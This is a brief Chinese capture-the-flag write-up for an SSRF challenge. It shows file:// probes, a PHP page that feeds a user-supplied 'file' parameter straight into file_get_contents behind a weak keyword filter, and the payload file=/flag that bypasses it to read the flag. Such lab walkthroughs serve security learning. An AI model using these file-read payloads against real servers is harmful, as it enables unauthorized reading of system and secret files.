#PHP伪协议 #SSRF

利用文件协议
`file://`
回显：
害羞羞，试试其他路径？

`file:///flag`
回显：
都说了这里看不了flag。。但是可以看看提示文件：/fl4g

`file:///fl4g`
回显：
你应该看看除了index.php，是不是还有个ha1x1ux1u.php

访问 ha1x1ux1u.php
```php
 <?php

highlight_file(__FILE__);
error_reporting(0);

$file = $_GET["file"];
if (stristr($file, "file")){
  die("你败了.");
}

//flag in /flag
echo file_get_contents($file); 
```

传入 `file=/flag`
over

参考
[[NISACTF 2022]easyssrf wp（SSRF入门）_Leafzzz__的博客-CSDN博客](https://blog.csdn.net/Leaf_initial/article/details/130072727)